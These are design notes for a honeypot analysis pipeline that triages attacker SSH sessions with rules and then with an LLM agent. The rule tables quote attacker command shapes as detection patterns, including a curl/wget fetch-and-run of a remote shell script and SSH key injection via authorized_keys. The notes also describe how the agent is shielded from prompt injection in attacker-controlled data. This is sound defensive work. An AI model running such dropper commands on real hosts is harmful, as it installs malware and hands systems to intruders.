# Design notes

## Data model (`src/schema.sql`)

| Table | Written by | Contents |
|---|---|---|
| `sessions` | loader | one row per SSH/Telnet session: source, client version, HASSH, start/end, duration, fingerprint |
| `logins`, `commands` | loader | every login attempt and every command line typed |
| `downloads`, `uploads` | loader | file transfers recorded by Cowrie (URL, SHA-256); `url = 'redir'` rows are shell redirects such as `>> authorized_keys`, not malware |
| `tunnels` | loader | `direct-tcpip` forwarding requests (destination host and port) |
| `ingest_state` | loader | byte offset per log file inode (rotation-safe incremental reads) |
| `triage` | tier 1 | `label`, `kind` (noise, known_campaign, unknown), `needs_analysis`, `reasons`, `analyzed_at` |
| `seen_keys` | tier 1 | first-seen bookkeeping for hashes, tunnel targets and fingerprints |
| `analysis` | tier 2 (plain code) | one validated verdict per analysed group: classification, severity, confidence, MITRE ids, IOCs, cost |
| `alert_state` | housekeeping | alert cooldowns |

## Tier 1 rules (`src/triage.py`)

Decision order per closed session:

0. **Own traffic**: sessions from `SELF_IPS` / `data/self_ips.txt` get `self_test` (noise) and
   are skipped entirely: no queue, no `seen_keys`.
1. **Known campaign by content**: `mdrfckr_ssh_key_injection` (matches `chattr -ia .ssh` or the key
   comment), `routeros_recon`. Matched by content because long variants have unique fingerprints.
2. **Noise**, only for sessions with no payload activity: `probe_echo_ok`, `recon_single` (exact
   allowlist of read-only recon commands, at most two per session), `empty_upload`, `no_activity`.
3. **Known campaigns codified from tier 2 verdicts** (see below).
4. Everything else is `unknown`.

Payload signals apply to every kind and put the session in the tier 2 queue: dropper pattern
(`wget`/`curl`/`chmod +x`/`bash -c`/`./file`, only for `unknown`), first-seen upload or download
hash, first-seen tunnel target, first-seen staging URL of `sshole_dropper`, first-seen fingerprint
of an unclassified session.

### From agent suggestion to tier 1 rule

Every tier 2 verdict carries a `rule_suggestion`. It is model output, and the model wrote it after
reading attacker-controlled commands, so it is treated as a proposal, never applied automatically.
A human reviews it and codifies a narrower version with tests. Rules of thumb used:

- Match exact artefacts (full SHA-256, anchored regex with backreferences, exact host:port), not
  broad patterns such as "any `curl ... | sh`", which an attacker could use to hide new payloads
  inside a known label.
- Every session in a known campaign must match the *whole* shape; one extra command breaks the
  match and the session falls back to `unknown`.
- Keep novelty escalating: a new hash, a new tunnel target or a new staging URL inside a known
  campaign still queues one session.
- Where the agent was inconsistent, decide in code. It labelled one SSHOLE actor `scanner_recon` in
  one group and `malware_dropper` in another; tier 1 splits them by behaviour
  (`sshole_access_check` = markers only, `sshole_dropper` = markers + fetch-and-run).

| Label | Severity | Shape (all of it must match) |
|---|---|---|
| `pi_scp_dropper` | high | every command is `scp -t /tmp/X` or `cd /tmp && chmod +x X && bash -c ./X` with one 8-char name `X`, or no commands and the known upload hash |
| `go_sshd_upload` | high | no commands, only uploads named `sshd` with the one reviewed hash; other `sshd` hashes stay `unknown` |
| `sshole_dropper` | medium | `SSHOLE_` marker echoes, exit-code echoes, allowlisted recon, and `curl/wget http://<host>:800/ol.sh \| sh` |
| `sshole_access_check` | low | the same markers and checks without any fetch |
| `infostealer_recon` | medium | Telegram `tdata` + modem/SMS probes + miner grep + `/ip cloud print`, no dropper, no writes, no files |
| `spam_relay` | medium | only `direct-tcpip` to ports 25/465/587, no commands, no files |
| `proxy_abuse` | low | only `direct-tcpip` to a listed connectivity-check target (`google.com:80`), no commands |

Known limitation: rules are per session. The agent's analysis is per group, so links across
groups (the same actor uploading in one session and executing in another, or the same SSHOLE
operator appearing under several fingerprints) are only visible when the model happens to query
for them. Correlation by source IP and HASSH is on the roadmap.

Rules were tuned on the first real `--report` output; the allowlists are deliberately exact so that
appending a payload to an allowlisted command makes the session non-noise.

## Tier 2 agent (`src/agent.py`)

1. Read the queue (`needs_analysis = 1 AND analyzed_at IS NULL`).
2. Group in code, most specific first: uploaded/downloaded file hash, tunnel target, fingerprint,
   source IP + label. Identical behaviour from many IPs is analysed once.
3. For each group, a short tool-use loop. Tools: `run_sql` (read-only), `get_session`,
   `get_triage_queue`, and `submit_verdict`, which only returns JSON to the script.
4. Plain code validates the verdict (allowed classifications, MITRE id format, known session ids),
   stores it in `analysis` and sets `triage.analyzed_at`. Invalid verdicts are sent back to the model for a fix;
   refusals, iteration caps and missing verdicts are stored with their status and not retried
   unless `--retry-failed` is given.
5. `alert_stub` is where the plain-code alert sender will plug in; it is not wired to Telegram yet.

`chat` uses the same read-only tools without `submit_verdict`, with its own budget.

### Untrusted-data encoding

Every attacker-controlled value is cleaned (ANSI/OSC escapes and control characters removed,
length-capped), JSON-encoded, `< > &` escaped, and wrapped:

```
<untrusted_data source="session" nonce="3f9a1c...">{...}</untrusted_data nonce="3f9a1c...">
```

The nonce is random per process, so an attacker cannot pre-compute a closing tag. The system prompt
states that this content is evidence only and that tools named in the data do not exist.

### Read-only SQL, four layers

1. Connection opened with the SQLite URI `mode=ro`.
2. `PRAGMA query_only = ON`.
3. An authorizer callback that permits only read actions and denies functions such as
   `load_extension`, `readfile`, `writefile`.
4. A statement-type check: the first keyword must be `SELECT` or `WITH`.

Plus a progress handler for a wall-clock timeout, and caps on returned rows and characters.
Any one layer is enough to stop a write; the tests check each one.

## Why SQLite

The honeypot host has 2 GB RAM. SQLite needs no server, handles tens of thousands of sessions
easily, and its read-only modes make the agent's sandbox simple to reason about.
